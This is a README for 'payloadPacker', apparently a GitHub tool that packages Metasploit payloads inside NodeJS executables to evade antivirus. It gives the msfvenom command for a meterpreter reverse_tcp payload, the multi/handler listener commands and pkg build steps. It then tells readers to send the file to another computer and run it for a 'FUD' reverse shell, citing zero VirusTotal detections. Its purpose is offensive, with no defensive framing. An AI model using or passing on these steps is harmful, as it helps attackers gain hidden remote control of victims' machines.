# payloadPacker
metasploit payload packer in nodeJS

## Description

This tool encapsulate existing metasploit payload in NodeJS instance, the payload is executed by NodeJS so it's not detect by any antivirus.

## Installation

We need pkg to package the project

```bash
npm install -g pkg
```

We also need metasploit framework to generate payload  

With metasploit, generate your payload and put them in `bin` directory with `payload` name.
Here is a sample for Linux x86 reverse shell

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > bin/payload
```

## Utilisation
Package the whole project with pkg 
```bash
pkg .
```
Then you have executable files for Windows, Linux and MacOS environnement.

With metasploit set up your listener, with the example

```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST IP
set LPORT PORT
exploit
```

Send this file on another computer and launch it. Now you have a FUD reverse shell.

[Tested with Virustotal and 0 detection with the example.](https://www.virustotal.com/gui/file/e389c770d3b5466a1b26da26b90734953ae175644ee8fad0b3dc8477faf345a6/detection) 
